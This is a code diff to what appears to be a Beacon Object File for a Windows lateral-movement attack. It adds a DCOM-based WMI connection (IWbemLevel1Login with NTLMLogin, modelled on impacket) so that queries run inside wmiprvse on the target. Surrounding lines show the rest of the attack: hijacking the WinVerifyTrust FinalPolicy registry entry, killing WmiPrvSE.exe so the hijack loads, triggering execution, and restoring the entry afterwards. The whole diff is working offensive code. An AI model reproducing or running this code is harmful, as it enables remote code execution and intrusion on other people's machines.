@@ -191,6 +191,90 @@ static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) 
 }
 
 /* ================================================================
+ * DCOM WMI connection -- uses IWbemLevel1Login like impacket
+ *
+ * ponytail: CoCreateInstance(WbemLocator, INPROC) + ConnectServer creates a
+ * local COM proxy. ExecQuery runs through the proxy and does NOT trigger
+ * WVT FinalPolicy inside wmiprvse on the target. impacket uses
+ * CoCreateInstanceEx(IWbemLevel1Login, REMOTE_SERVER) which activates
+ * the COM object inside wmiprvse via DCOM. All calls then run server-side,
+ * triggering WVT. This function replicates that path.
+ * ================================================================ */
+
+/* IWbemLevel1Login vtable layout (from wbemcli.h / wbemint.h) */
+struct IWbemLevel1Login : public IUnknown {
+    virtual HRESULT STDMETHODCALLTYPE EstablishPosition(LPWSTR, DWORD, DWORD*) = 0;
+    virtual HRESULT STDMETHODCALLTYPE RequestChallenge(LPWSTR, LPWSTR, DWORD, LPWSTR, DWORD, LPWSTR*) = 0;
+    virtual HRESULT STDMETHODCALLTYPE WBEMLogin(LPWSTR, BYTE*, long, IWbemContext*, IWbemServices**) = 0;
+    virtual HRESULT STDMETHODCALLTYPE NTLMLogin(LPWSTR, LPWSTR, long, IWbemContext*, IWbemServices**) = 0;
+};
+
+static IWbemServices* wmi_connect_dcom(const char *target, const wchar_t *ns_suffix) {
+    /* CLSID_WbemLevel1Login {8BC3F05E-D86B-11D0-A075-00C04FB68820} */
+    CLSID clsid_L1Login = {0x8BC3F05E, 0xD86B, 0x11D0,
+                             {0xA0, 0x75, 0x00, 0xC0, 0x4F, 0xB6, 0x88, 0x20}};
+    /* IID_IWbemLevel1Login {F309AD18-D86A-11D0-A075-00C04FB68820} */
+    IID iid_L1Login = {0xF309AD18, 0xD86A, 0x11D0,
+                        {0xA0, 0x75, 0x00, 0xC0, 0x4F, 0xB6, 0x88, 0x20}};
+
+    /* Wide target for COSERVERINFO */
+    wchar_t wTarget[256];
+    int i = 0;
+    for (const char *p = target; *p && i < 254; p++) wTarget[i++] = (wchar_t)*p;
+    wTarget[i] = L'\0';
+
+    COSERVERINFO si;
+    MSVCRT$memset(&si, 0, sizeof(si));
+    si.pwszName = wTarget;
+
+    MULTI_QI mqi;
+    MSVCRT$memset(&mqi, 0, sizeof(mqi));
+    mqi.pIID = &iid_L1Login;
+
+    TMB_INFO("DCOM remote activation (IWbemLevel1Login) on %s", target);
+    HRESULT hr = OLE32$CoCreateInstanceEx(clsid_L1Login, NULL,
+                                           CLSCTX_REMOTE_SERVER, &si, 1, &mqi);
+    if (FAILED(hr)) {
+        TMB_ERR("CoCreateInstanceEx(WbemLevel1Login) failed: 0x%08lx", hr);
+        return NULL;
+    }
+    if (FAILED(mqi.hr)) {
+        TMB_ERR("MULTI_QI query failed: 0x%08lx", mqi.hr);
+        return NULL;
+    }
+
+    IWbemLevel1Login *pLogin = (IWbemLevel1Login*)mqi.pItf;
+
+    /* Set proxy blanket on the login interface */
+    OLE32$CoSetProxyBlanket((IUnknown*)pLogin, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
+                             NULL, EOAC_NONE);
+
+    /* Build namespace path: //./root/cimv2 format */
+    wchar_t wNs[256];
+    i = 0;
+    wNs[i++] = L'/'; wNs[i++] = L'/'; wNs[i++] = L'.'; wNs[i++] = L'/';
+    for (int j = 0; ns_suffix[j] && i < 254; j++) wNs[i++] = ns_suffix[j];
+    wNs[i] = L'\0';
+
+    TMB_INFO("NTLMLogin(%S)", wNs);
+    IWbemServices *pSvc = NULL;
+    hr = pLogin->NTLMLogin(wNs, NULL, 0, NULL, &pSvc);
+    pLogin->Release();
+
+    if (FAILED(hr)) {
+        TMB_ERR("NTLMLogin failed: 0x%08lx", hr);
+        return NULL;
+    }
+
+    OLE32$CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL,
+                             RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
+                             NULL, EOAC_NONE);
+    TMB_INFO("DCOM WMI connected");
+    return pSvc;
+}
+
+/* ================================================================
  * Phase 2: Remote registry via WMI StdRegProv
  *
  * Uses root/default namespace -- always available, no RemoteRegistry needed.
@@ -609,7 +693,7 @@ extern "C" void go(char *args, int alen) {
     /* ---- Phase 2.5: Kill wmiprvse so a fresh one picks up the hijack ---- */
     /* Provider cache is per-process. Stale wmiprvse won't read new registry. */
     {
-        IWbemServices *pSvcKill = wmi_connect(target, L"ROOT\\CIMV2");
+        IWbemServices *pSvcKill = wmi_connect_dcom(target, L"ROOT\\CIMV2");
         if (pSvcKill) {
             BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
             BSTR bstrQ = OLEAUT32$SysAllocString(L"SELECT Handle FROM Win32_Process WHERE Name='WmiPrvSE.exe'");
@@ -665,7 +749,7 @@ extern "C" void go(char *args, int alen) {
     /* ---- Phase 3: Trigger via WMI ---- */
     KERNEL32$Sleep(500);
 
-    IWbemServices *pSvcCimv2 = wmi_connect(target, L"ROOT\\CIMV2");
+    IWbemServices *pSvcCimv2 = wmi_connect_dcom(target, L"ROOT\\CIMV2");
     if (!pSvcCimv2) {
         TMB_WARN("Failed to connect to root/cimv2 -- restoring");
         restore_finalpolicy(pSvcDefault, guid, &backup);
